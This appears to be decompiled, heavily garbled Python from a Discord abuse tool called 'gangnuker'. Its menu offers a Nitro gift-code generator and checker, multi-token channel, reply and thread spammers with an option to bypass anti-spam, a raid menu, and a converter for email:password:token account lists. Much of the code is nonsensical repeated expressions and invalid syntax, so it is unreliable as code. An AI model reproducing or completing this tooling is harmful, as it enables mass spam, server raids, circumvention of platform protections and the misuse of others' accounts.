            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['[']
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']
            with open('data/nitro.txt') as file:
                for line in file.readlines():
                    nitro = line.strip('\n')
                    url = 'https://discordapp.com/api/v6/entitlements/gift-codes/' + nitro + '?with_application=false&with_subscription_plan=true'
                    r = requests.get(url)
                    if r.status_code == 200:
                        print(f'''[{g}-{w}] Valid | {g}{nitro}{w}''')
                        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n']
                    else:
                        print(f'''[{lr}x{w}] Invalid | {nitro}''')
                    input(f'''\n[{g}>{w}] All Nitro Codes Have Been Checked!\n[{m}>{w}] Press ENTER to Exit: ''')
                    exit = clear()
                    exit = spammer()
                []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''](None, None, None)
            if not []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']']:
                pass
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}''']
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}''']
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38']
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']
    if choice == '34':
        tokens = open('tokens.txt', 'r').read().splitlines()
        file = open('tokens.txt', 'r')
        token_count = 0
        for line in file:
            if line != '\n':
                token_count += 1
        channel_id = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        msg = input('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        delay = input('[\x1b[95m>\x1b[95m\x1b[37m] Delay: ')
        amount = input('[\x1b[95m>\x1b[95m\x1b[37m] Amount of messages: ')
        amount = int(amount)
        extreme_speed = input('[\x1b[95m>\x1b[95m\x1b[37m] Enable Speed Mode? [y/n]: ').lower()
        msg = msg.lower()
        msg = msg.replace(' ', '')
        with open('emojitext.txt', 'w') as f:
            for i in range(len(msg)):
                f.write(':regional_indicator_' + msg[i] + ': ')
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['](None, None, None)
        if not []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']:
            pass
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n']
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}''']
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']']
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}''']
        msg = open('data/emojitext.txt', 'r').read()
    if choice == '35':
        tokens = open('tokens.txt', 'r').read().splitlines()
        file = open('tokens.txt', 'r')
        token_count = 0
        for line in file:
            if line != '\n':
                token_count += 1
        print('\n[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        channel_id = input()
        print('[\x1b[95m>\x1b[95m\x1b[37m] Delay: ')
        delay = input()
        print('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        msg = input()
        amount = input('[\x1b[95m>\x1b[95m\x1b[37m] Amount of messages: ')
        amount = int(amount)
        print('[\x1b[95m>\x1b[95m\x1b[37m] Bypass AntiSpam [y/n]: ')
        antispam = input().lower()
        print('[\x1b[95m>\x1b[95m\x1b[37m] Enable Speed Mode? [y/n]: ')
        extreme_speed = input().lower()
        if not extreme_speed == 'y':
            pass
        amount = int(amount / token_count)
        for None in tokens:
            token = None
    if choice == '36':
        tokens = open('tokens.txt', 'r').read().splitlines()
        guild_id = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Server ID: ')
        delay = input('[\x1b[95m>\x1b[95m\x1b[37m] Delay: ')
        msg = input('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        amount = input('[\x1b[95m>\x1b[95m\x1b[37m] Amount of Messages?: ')
        amount = int(amount)
        amount = amount / 2
        amount = int(amount)
        antispam = input('[\x1b[95m>\x1b[95m\x1b[37m] Bypass AntiSpam [y/n]: ').lower()
        delay = int(delay) / 1000
        threading.Thread(multispammer, (tokens, guild_id, msg, antispam, delay, amount), **('target', 'args')).start()
    if choice == '37':
        tokens = open('tokens.txt', 'r').read().splitlines()
        channel_id = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        message_id = input('[\x1b[95m>\x1b[95m\x1b[37m] Message ID: ')
        text = input('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        amount = input('[\x1b[95m>\x1b[95m\x1b[37m] Amount of replies for each token: ')
        amount = int(amount)
        for None in tokens:
            token = None
    if choice == '38':
        tokens = open('tokens.txt', 'r').read().splitlines()
        print('\n[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        channel_id = input()
        print('[\x1b[95m>\x1b[95m\x1b[37m] Thread name: ')
        thread_name = input()
        print('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        message = input()
        amount = input('[\x1b[95m>\x1b[95m\x1b[37m] Amount of threads for each token: ')
        for None in tokens:
            token = None
    if choice == '39':
        webbrowser.open('https://gangnuker.org')
        sleep(2)
        spammer()
    if choice == '40':
        open('tokens.txt', 'w').write('')
        for None in tokens:
            token = None
            token = changeFormat(token)
        time.sleep(1)
        exit = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == 'raid':
        cls()
        gangnukerlogo()
        print(f'''\n{m}[{Fore.WHITE}33{Fore.RESET}{m}]{Fore.RESET} raid options                                                                      {m}[{w}<{m}]{w} Previous Page\n        ''')
        choice = input(f'''{m}[{w}>{m}]{w} Choice?: ''')
    if choice == '39':
        webbrowser.open('https://gangnuker.org')
        sleep(2)
        spammer()
        if choice == '<':
            clear()
            spammer()
            return None
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}'''] if antispam == 'y' else []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'] if extreme_speed == 'y' else []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous 